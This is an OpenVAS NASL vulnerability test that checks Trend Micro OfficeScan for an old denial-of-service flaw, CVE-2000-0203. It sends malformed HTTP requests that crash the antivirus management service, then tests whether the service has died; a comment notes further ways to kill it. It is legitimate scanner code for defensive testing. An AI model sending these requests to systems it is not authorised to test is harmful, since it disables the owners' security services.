# OpenVAS Vulnerability Test
# $Id: tmosdos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Trend Micro OfficeScan Denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the Trend Micro OfficeScan 
antivirus management service by sending an incomplete 
HTTP request.";

tag_solution = "upgrade your software";

# http://online.securityfocus.com/bid/1013
#
# TBD:
# Sending garbage may also kill the service or make it eat 100% CPU
# Opening 5 connections while sending garbage will kill it

if(description)
{
 script_id(11059);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1013);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2000-0203");
 script_name("Trend Micro OfficeScan Denial of service");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 
 summary = "Crashes OfficeScan";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 12345);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("misc_func.inc");

function check(port)
{
 if (http_is_dead(port: port)) return (0);

 soc = http_open_socket(port);
 if(!soc)return(0);

 send(socket:soc, data: attack1);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 soc = http_open_socket(port);
 if(!soc) { security_warning(port); return(0); }

 send(socket:soc, data: attack2);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 if (http_is_dead(port: port)) security_warning(port);
}


 # get or GET?
 attack1 = string("get /  \r\n");
 attack2 = string("GET /  \r\n");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:12345);
foreach port (ports)
{
 check(port:port);
}

